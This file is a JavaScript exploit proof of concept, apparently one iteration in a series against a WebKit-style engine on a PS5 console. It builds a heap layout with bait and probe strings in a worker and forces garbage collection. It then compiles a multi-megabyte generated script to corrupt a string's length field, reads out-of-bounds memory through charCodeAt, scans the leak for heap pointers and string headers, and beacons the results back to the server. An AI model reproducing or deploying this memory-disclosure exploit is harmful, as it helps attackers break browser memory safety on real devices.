// p388 - OOB charCodeAt via m_length corruption + SHORT probes
//
// V387 CONFIRMED: m_length corrupted from 50000 to 39800 (10/10 strings).
// 39800 < 50000 so no OOB. Fix: use 10000-char probes.
// If m_length = 39800 > 10000: charCodeAt(10001..39799) = ~29800 bytes OOB read!
//
// APPROACH:
//   - Bait strings: 20 x 100000 chars (proven heap layout from V383/V387)
//   - Probe strings: 10 x 10000 chars (SHORT, so corrupted m_length >> actual)
//   - Also try 3 probe sizes: 10000, 5000, 1000 to bracket the OOB window
//
// Beacon prefix: V388-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V388-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V388-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var probes = [];
    var probeLens = [];
    var baseUrl = '';
    var BAIT_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V388-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      var chunk = '';
      for (var i = 0; i < 100; i++) chunk += ch;
      var reps = Math.ceil(len / 100);
      for (var i = 0; i < reps; i++) s += chunk;
      s = s.substring(0, len);
      s.charCodeAt(0);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        var baits = [];
        for (var i = 0; i < 20; i++) {
          baits.push(makeStr(BAIT_LEN, 'B'));
        }
        beacon('BAIT-' + baits.length);

        // 3 probe sizes to bracket the OOB window
        var sizes = [10000, 10000, 10000, 10000, 5000, 5000, 5000, 1000, 1000, 1000];
        for (var i = 0; i < sizes.length; i++) {
          probes.push(makeStr(sizes[i], 'P'));
          probeLens.push(sizes[i]);
        }
        beacon('PROBES-' + probes.length);

        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = null;
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var oobCount = 0;
        var truncCount = 0;

        for (var i = 0; i < probes.length; i++) {
          try {
            var p = probes[i];
            var origLen = probeLens[i];
            var len = p.length;

            if (len === origLen) {
              beacon('P' + i + '-INTACT-' + len);
              continue;
            }

            beacon('P' + i + '-LEN-' + len + '-orig' + origLen);

            if (len > origLen) {
              oobCount++;
              var oobBytes = len - origLen;
              beacon('P' + i + '-OOB-' + oobBytes + 'B');

              // Verify tail of in-bounds data
              var inOk = true;
              for (var j = origLen - 5; j < origLen; j++) {
                if (p.charCodeAt(j) !== 0x50) { inOk = false; break; }
              }
              beacon('P' + i + '-INBOUND-' + (inOk ? 'OK' : 'BAD'));

              // Read first 512 bytes of OOB data
              var scanEnd = Math.min(len, origLen + 512);
              var hex = '';
              for (var j = origLen; j < scanEnd; j++) {
                try {
                  var c = p.charCodeAt(j);
                  if (c !== c) { hex += 'XXXX'; break; }
                  // charCodeAt returns 16-bit, but 8-bit string stores bytes
                  hex += hexByte(c);
                } catch(ex) { hex += 'EE'; break; }
              }
              // Send hex in 60-char chunks (30 bytes each)
              for (var off = 0; off < hex.length; off += 60) {
                beacon('P' + i + '-H' + (origLen + off/2) + '-' + hex.substring(off, off + 60));
              }

              // Pointer scan: look for 6-byte patterns typical of x86-64 heap ptrs
              // On FreeBSD/PS5, heap is typically in 0x0000008xxxxxxxx range or similar
              for (var j = origLen; j + 8 <= Math.min(len, origLen + 2048); j += 4) {
                try {
                  var b0 = p.charCodeAt(j);
                  var b1 = p.charCodeAt(j+1);
                  var b2 = p.charCodeAt(j+2);
                  var b3 = p.charCodeAt(j+3);
                  var b4 = p.charCodeAt(j+4);
                  var b5 = p.charCodeAt(j+5);
                  var b6 = p.charCodeAt(j+6);
                  var b7 = p.charCodeAt(j+7);
                  // 64-bit LE: b7b6b5b4 b3b2b1b0
                  // Check for non-zero upper half indicating a pointer
                  if (b7 === 0 && b6 === 0 && b5 > 0 && b5 < 0x10) {
                    // Looks like 0x00000Nxxxxxxxxxx - typical userspace pointer
                    var pstr = hexByte(b7) + hexByte(b6) + hexByte(b5) + hexByte(b4) +
                               hexByte(b3) + hexByte(b2) + hexByte(b1) + hexByte(b0);
                    beacon('P' + i + '-PTR-' + j + '-0x' + pstr);
                  }
                  // Also check for 0x00007Fxxxxxxxxxx (high mmap region)
                  if (b7 === 0 && b6 === 0x7f) {
                    var pstr = hexByte(b7) + hexByte(b6) + hexByte(b5) + hexByte(b4) +
                               hexByte(b3) + hexByte(b2) + hexByte(b1) + hexByte(b0);
                    beacon('P' + i + '-MMAP-' + j + '-0x' + pstr);
                  }
                  // Check for vtable-like: non-zero 8 bytes that look like a code pointer
                  if (b7 === 0 && b6 === 0 && b5 === 0 && b4 > 0 && b4 < 0x20) {
                    var pstr = hexByte(b7) + hexByte(b6) + hexByte(b5) + hexByte(b4) +
                               hexByte(b3) + hexByte(b2) + hexByte(b1) + hexByte(b0);
                    beacon('P' + i + '-LOW-' + j + '-0x' + pstr);
                  }
                } catch(ex) { break; }
              }

              // Look for StringImpl header pattern (refcount + length + pointer)
              for (var j = origLen; j + 24 <= Math.min(len, origLen + 4096); j += 8) {
                try {
                  // StringImpl: refCount(4) | m_length(4) | m_data8(8) | m_hashAndFlags(4)
                  var rc = (p.charCodeAt(j) | (p.charCodeAt(j+1) << 8) |
                           (p.charCodeAt(j+2) << 16) | ((p.charCodeAt(j+3) << 24) >>> 0)) >>> 0;
                  var ml = (p.charCodeAt(j+4) | (p.charCodeAt(j+5) << 8) |
                           (p.charCodeAt(j+6) << 16) | ((p.charCodeAt(j+7) << 24) >>> 0)) >>> 0;
                  // StringImpl has refcount > 0, m_length in sane range
                  if (rc >= 1 && rc <= 100 && ml >= 100 && ml <= 200000) {
                    beacon('P' + i + '-SIMPL-' + j + '-rc' + rc + '-len' + ml);
                  }
                } catch(ex) { break; }
              }

            } else {
              truncCount++;
              beacon('P' + i + '-TRUNC-' + len + '-from' + origLen);
            }
          } catch(ex) {
            beacon('P' + i + '-ERR-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('SUMMARY-OOB' + oobCount + '-TRUNC' + truncCount + '-INTACT' + (probes.length - oobCount - truncCount));
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p388fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p388ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p388ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
